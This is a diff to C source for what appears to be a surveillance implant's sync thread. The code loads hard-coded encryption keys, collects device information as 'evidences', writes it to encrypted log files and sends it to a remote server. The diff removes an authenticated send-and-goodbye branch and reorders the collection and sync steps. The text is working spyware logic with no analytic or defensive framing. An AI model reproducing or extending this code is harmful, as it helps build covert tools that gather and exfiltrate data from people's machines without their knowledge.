@@ -16,8 +16,6 @@ extern BYTE pLogKey[32];
 
 VOID SyncThreadFunction()
 {
-	PBYTE pCryptedBuffer;
-
 	memcpy(pServerKey, CLIENT_KEY, 32);
 	memcpy(pConfKey, ENCRYPTION_KEY_CONF, 32);
 	memcpy(pLogKey, ENCRYPTION_KEY, 32);
@@ -34,30 +32,14 @@ VOID SyncThreadFunction()
 #ifdef _DEBUG
 		OutputDebugString(L"[*] Starting sync...\n");
 #endif
-		// auth & id
-		if (SyncWithServer())
-		{
-			// get evidences
-			PWCHAR pDeviceInfo = GetDeviceInfo();
-			HANDLE hFile = CreateLogFile(PM_DEVICEINFO, NULL, 0);
-			WriteLogFile(hFile, (PBYTE)pDeviceInfo, wcslen(pDeviceInfo) * sizeof(WCHAR));
-			CloseHandle(hFile);
-			free(pDeviceInfo);
+		// get evidences
+		PWCHAR pBuffer = GetDeviceInfo();
+		HANDLE hFile = CreateLogFile(PM_DEVICEINFO, NULL, 0);
+		WriteLogFile(hFile, (PBYTE)pBuffer, wcslen(pBuffer) * sizeof(WCHAR));
+		free(pBuffer);
+		CloseHandle(hFile);
 
-			// for each file, send
-			ProcessEvidenceFiles();
-		}
-#ifdef _DEBUG
-		else
-			OutputDebugString(L"[!!] Cannot sync with server!!\n");
-#endif
-		// bye bye	
-		WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_BYE, NULL, 0, (PBYTE)pSessionKey, &pCryptedBuffer));
-		free(pCryptedBuffer);
-
-		
-		break; // FIXME 
-
+		SyncWithServer();
 	}
 }
 
